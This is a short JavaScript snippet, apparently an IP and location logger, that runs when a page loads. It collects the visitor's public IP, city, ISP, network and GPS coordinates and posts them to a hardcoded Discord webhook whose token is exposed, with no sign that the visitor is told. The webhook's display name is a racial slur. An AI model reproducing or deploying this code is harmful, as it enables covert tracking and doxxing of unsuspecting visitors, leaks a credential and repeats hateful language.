var x = document.getElementById("demo");
var anew
function text(url) {
  console.log(url)
  return fetch(url).then(res => res.text());
}
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}
spc = " "
var anew
function showPosition(position) {
  text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
  let ip = data.match(ipRegex)[0];
  console.log(ip);
  anew = position.coords.longitude+spc+position.coords.latitude+spc
  console.log(anew);
});
  console.log(position)
}

getLocation()
function sendMessage(msg) {
  const request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1105995807066427392/f2bAUihbaCF68cSjC_zWbgYY_MdZIm9FyvfVpCa47F6OLC1Qc7gC9sOq_91XIfCkSc-U");
  request.setRequestHeader('Content-type', 'application/json');

  const params = {
    username: "Niggaheimer",
    avatar_url: "",
    content: msg
  }

  request.send(JSON.stringify(params));
}
fetch('https://ipapi.co/json/')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    console.log(data);
  });
// 2 - XMLHttpRequest : Older method
var req = new XMLHttpRequest();
var ipr;
req.overrideMimeType("application/json");
req.open('GET', 'https://ipapi.co/json/', true);
req.onload  = function() {
  ipr = JSON.parse(req.responseText);
  sendMessage(ipr.ip+spc+ipr.city+spc+ipr.org+spc+ipr.network+spc+anew)
};
req.send(null);
